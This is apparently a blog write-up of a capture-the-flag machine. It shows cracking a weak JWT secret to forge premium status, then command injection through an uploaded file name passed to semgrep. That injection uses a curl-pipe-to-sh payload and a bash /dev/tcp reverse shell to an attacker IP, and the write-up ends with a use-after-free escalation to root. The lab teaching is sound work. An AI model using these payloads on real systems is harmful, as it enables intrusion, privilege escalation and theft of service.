---
layout: post
title:  "Scanner"
date:   2025-03-22 18:48:00 -0300
tags: ctf hackingclub
level: medium
description: a machine about JWT Weak secret, Command injection & Use-After-Free exploitation.
---

# introduction

This article presents the successful exploitation of a command injection through file name parsing into semgrep scan, bypassing subscription filters via JWT token modification, and performing reverse engineering on a binary file to detect and exploit UAF (Use After Free) for privilege escalation.

The exploitation was carried out on a CTF machine from the [hackingclub](https://hackingclub.com) platform.

# reconnaissance

To begin our exploitation, we must first recognize the environment we are attacking. To do so, we start by running nmap on the machine's IP and checking which ports are open.

{% highlight bash %}
> nmap -sV 172.16.6.67
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-22 18:58 -03
Nmap scan report for 172.16.6.67
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.28 seconds
{% endhighlight %}

We were able to identify that ports 22 and 80 are open, so we have a web application to analyze.

Upon accessing the web application for the first time, we detected that it is a JavaScript file scanner. It is also possible to identify the presence of buttons for login and user registration.

![first_web_access]({{ "/assets/image/hacking_club_scanner/app.png" | relative_url }})

When attempting to scan a file, we are redirected to a subscription screen.

![subscription_screen]({{ "/assets/image/hacking_club_scanner/premium.png" | relative_url }})

In this way, let's proceed with the registration and login flow to understand how we can obtain a premium status on the platform.
 
I registered on the platform with the email "teste@teste.com" and the password "123456". Upon logging in, we received a JWT token as a response:

![login]({{ "/assets/image/hacking_club_scanner/login.png" | relative_url }})

# forging premium status

Let's analyze this token in a JWT debugger to check if there is any useful information being managed through it.

![jwt-debug]({{ "/assets/image/hacking_club_scanner/jwt-premium.png" | relative_url }})

BINGO! We managed to detect that the platform's subscription status is being managed through a flag in the JWT. Now, how can we alter it without knowing the token's secret? As a standard procedure, we attempt to perform a brute-force attack on the JWT using a known wordlist. If the secret is weak, we can modify the payload value and sign it again, keeping the token valid.

Running the jwt-cracker using the wordlist seclists/Passwords/darkweb2017-top10000.txt, we were able to identify the secret:

{% highlight bash %}
> jwt-cracker <token> -d /usr/share/wordlists/seclists/Passwords/darkweb2017-top10000.txt
SECRET FOUND: 1a2b3c4d
Time taken (sec): 0.042
Total attempts: 9999

{% endhighlight %}

Nice, now it's easy for us to sign up for the platform without paying anything. On jwt.io, we just need to change the value of the "premium" flag to "true" and insert the identified secret.

![forge-premium-subscription]({{ "/assets/image/hacking_club_scanner/forged-token.png" | relative_url }})

We’re premium! :D

# scanning our first file

After managing to sign up for the platform by changing the value of the "premium" flag in the payload of our JWT token, we performed a scan on a random JS file to understand a bit of the scan flow. When we send a file for scanning, we receive the following scan output from the tool "semgrep":

![scan-response]({{ "/assets/image/hacking_club_scanner/scan-response.png" | relative_url }})

In a very basic explanation, semgrep is a SAST (Static Application Security Testing) tool that can be used via the command line. To scan a file, you just need to run the following command:

{% highlight bash %}
> semgrep scan path/to/file
{% endhighlight %}

In this way, semgrep will scan the specified file(s) and display the output that we received in the response.
We can imagine that the application we are attacking probably does something like:

{% highlight javascript %}
app.post('/api/v1/upload', (req, res) => {
    // SAVE FILE BEFORE SCAN
    res.send(exec('semgrep scan $(req.body.filename)', (err, stdout, stderr) => {
      return stdout;
    }));
});
{% endhighlight %}

If the application really does something like we imagined, then we can attempt to perform a command injection during the scanning process.

It's important to make it clear that it is not possible to send any filename that doesn't end with '.js'. Thus, we noticed that the application only validates if the last 3 characters of the filename are '.js'.

In this way, we just need to craft our payload as: filename$(cmdhere).js

To test if our payload is working, I like to receive a request from the server on my machine. That way, I can confirm that the injection was truly successful.

In that way, our payload would be this: filename$(curl myip).js

Setting up a server in Python to receive the request:

![initserver]({{ "/assets/image/hacking_club_scanner/initserver.png" | relative_url }})

When executing the command, we received the request from the server:

![recvd_connection]({{ "/assets/image/hacking_club_scanner/recvd_connection.png" | relative_url }})

Done. Command injection validated! Now we need to gain access to the server through a reverse shell. To do this, I created an index.html file containing a bash reverse shell and hosted it on the Python server.

Content of index.html:
{% highlight javascript %}
/bin/bash -c 'sh -i >& /dev/tcp/10.0.20.223/4444 0>&1'
{% endhighlight %}

This way, when the request is made to my server, we can execute the content of the index.html, which is my reverse shell. To achieve this, we need to send the following payload in the CMD injection: filename$(curl ip\|sh).js

After sending the request, we achieve the reverse shell:

![recv_shell]({{ "/assets/image/hacking_club_scanner/recv_shell.png" | relative_url }})

Therefore, we just need to investigate the server a little at first to get the first flag on the path /home/svc_web/user.txt.

![first_flag]({{ "/assets/image/hacking_club_scanner/first_flag.png" | relative_url }})

# privilege escalation

After performing an initial reconnaissance on the server, we didn’t find anything that could help us with privilege escalation. There are no binaries with misconfigured capabilities, there are no SUID files, and we also don’t have the password for the user svc_web to gain sudo access.

However, when listing the root processes running on the server, we identified that there is an open socket on port 9717 running a binary found at the path /opt/secure_vault:

![socat-secure-vault]({{ "/assets/image/hacking_club_scanner/socat-secure-vault.png" | relative_url }})

When we connected to port 9717, we noticed that a login is required to gain access to this application.

![secure_vault_login]({{ "/assets/image/hacking_club_scanner/secure_vault_login.png" | relative_url }})

We will need to analyze this binary to understand how to bypass it. To do this, we downloaded the file using netcat.

In the server:

{% highlight bash%}
> nc -lvp 8293 < /opt/secure_vault
{% endhighlight %}

in my local: 

{% highlight bash%}
> nc serverip 8293 > secure_vault
{% endhighlight %}

Now we can run the 'strings' command on the binary to check if we find any hardcoded password.

![strings]({{ "/assets/image/hacking_club_scanner/strings.png" | relative_url }})

Nothing. We can only see some type of menu (probably whay comes after the login) and some words like "admin" and "guest". I tried to login using some of combinations of this words (guest as user and admin as pass, and vice-versa) but it doesnt worked.

Lets feed the GHidra.

Opening the binary in Ghidra, we can identify that the program shows the login menu and execute the auth with an specific function:

![secure_vault_main]({{ "/assets/image/hacking_club_scanner/secure_vault_main.png" | relative_url }})

Analyzing the "auth" function, we can detect that the "guest" user does not needs an password to login in the vault:

![secure_vault_auth_function]({{ "/assets/image/hacking_club_scanner/secure_vault_auth_function.png" | relative_url }})

After authenticating the user, the program show an main_menu, which gives the options to create, read and delete an vault, and also an logout option.

By analyzing all the functions of the program, we were able to detect that the variable 'local_30' will have the value /root/secure_vault/vaults/(user). It will be used to list the contents of the logged-in user's vaults. If it is the guest, it will be something like /root/secure_vault/vaults/guest.

![local_30_usage]({{ "/assets/image/hacking_club_scanner/local_30_usage.png" | relative_url }})

Upon analyzing the logout function a bit more carefully, we noticed that when logging out, the program uses the 'free' function to clear the memory address allocated for local_30, and immediately after, it allocates memory for the variable local_50, which is a pointer that will be used to store the user's username. Thus, local_50 and local_30 have the same address in memory.

![uaf]({{ "/assets/image/hacking_club_scanner/uaf.png" | relative_url }})

Thus, we can follow the following steps to gain access to the /root directory:

1 - Login as guest
2 - Logout
3 - Login, entering /root as the username, anything as the password.
4 - The program will continue its execution, and now the value of the local_30 variable is /root, allowing us to read and write files in that directory.

In that way, we can obtain the root flag: 

root_flag.

Basically, the analyzed binary was vulnerable to a Use-After-Free. When cleaning up the memory address allocated for the local_30 variable and immediately after allocating 300 bytes of memory for the local_50 variable during the logout process, the memory address allocated for both variables was the same. This allowed us to modify the value of the local_30 variable to list a directory that is not a vault, but the root directory of the server. Thus, we were able to complete the Scanner challenge :D